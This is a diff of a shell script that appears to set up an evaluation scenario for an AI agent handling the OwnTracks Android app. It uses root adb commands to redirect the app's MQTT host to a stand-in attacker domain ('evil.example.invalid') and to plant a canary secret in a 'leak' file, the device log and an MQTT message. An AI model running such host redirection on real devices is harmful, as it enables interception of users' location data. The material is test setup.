@@ -25,7 +25,8 @@ MOSQUITTO_CONTAINER_NAME="${runtime_values[4]}"
 FAKE_LOG_FILE="$SCENARIO_DIR/fake_agent_log.log"
 printf 'trusted-host scenario 0\n' > "$FAKE_LOG_FILE"
 
-timeout 20 adb shell su 0 sh -c "sed -i 's#<string name=\"host\">10.0.2.2</string>#<string name=\"host\">evil.example.invalid</string>#' /data/data/$PKG/shared_prefs/${PKG}_preferences.xml"
+timeout 20 adb shell \
+    "su 0 sh -c 'sed -i \"s#<string name=\\\"host\\\">10.0.2.2</string>#<string name=\\\"host\\\">evil.example.invalid</string>#\" \"/data/data/$PKG/shared_prefs/${PKG}_preferences.xml\"'"
 PKG="$PKG" python3 - <<'PY'
 import os
 from pathlib import Path
@@ -86,6 +87,8 @@ PY
 )
 CANARY="${secret_values[0]}"
 PEER_PASSWORD="${secret_values[1]}"
-timeout 20 adb shell su 0 sh -c "mkdir -p /sdcard/Download && printf '%s' '$CANARY' > /sdcard/Download/owntracks_leak.txt"
+CANARY_FOR_SHELL="$(printf '%s' "$CANARY" | sed "s/'/'\\\\''/g")"
+timeout 20 adb shell \
+    "su 0 sh -c 'mkdir -p /sdcard/Download && printf %s '$CANARY_FOR_SHELL' > /sdcard/Download/owntracks_leak.txt'"
 timeout 20 adb shell log -t OwnTracksScenario "$CANARY" >/dev/null 2>&1 || true
 timeout 20 docker exec "$MOSQUITTO_CONTAINER_NAME" mosquitto_pub -h localhost -p 1883 -u "$PEER_USERNAME" -P "$PEER_PASSWORD" -t "$AGENT_PEER_TOPIC" -m "{\"_type\":\"status\",\"status\":\"$CANARY\",\"tst\":1700002001}" >/dev/null
